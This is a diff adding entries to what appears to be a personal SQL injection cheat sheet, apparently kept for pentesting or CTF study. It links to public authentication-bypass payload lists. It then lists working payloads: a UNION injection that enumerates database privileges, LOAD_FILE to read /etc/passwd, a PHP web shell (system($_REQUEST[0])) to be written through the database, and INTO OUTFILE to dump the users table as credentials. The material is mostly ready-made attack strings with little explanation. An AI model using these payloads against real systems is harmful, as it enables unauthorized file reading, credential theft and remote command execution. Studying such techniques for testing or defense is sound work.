@@ -7,3 +7,38 @@
 #### Fuzzing SQLi
 https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt
 
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt
+
+
+#### Privileges
+
+Check for file privileges:
+```sql
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+```
+
+#### load file
+
+```sql
+SELECT LOAD_FILE('/etc/passwd');
+```
+
+#### write file
+shell
+```php
+<?php system($_REQUEST[0]); ?>
+```
+
+```sql
+SHOW VARIABLES LIKE 'secure_file_priv';
+```
+secure_file_priv defines scope of of available files, if empty - permits everything
+
+```sql
+SELECT * from users INTO OUTFILE '/tmp/credentials';
+```
+
+hint for working with bin data:
+```sql
+FROM_BASE64("base64_data")'
+```
